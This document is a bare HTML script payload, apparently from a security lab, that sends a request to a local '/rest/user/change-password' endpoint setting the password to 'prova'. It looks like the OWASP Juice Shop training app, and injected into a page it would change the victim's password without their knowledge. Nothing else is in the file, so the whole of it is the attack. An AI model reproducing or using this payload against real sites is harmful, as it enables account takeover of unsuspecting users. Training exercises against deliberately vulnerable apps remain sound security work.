<script>
    http = new XMLHttpRequest();
    http.open("GET", "http://localhost:3000/rest/user/change-password?new=prova&repeat=prova", true);
    http.send();
</script>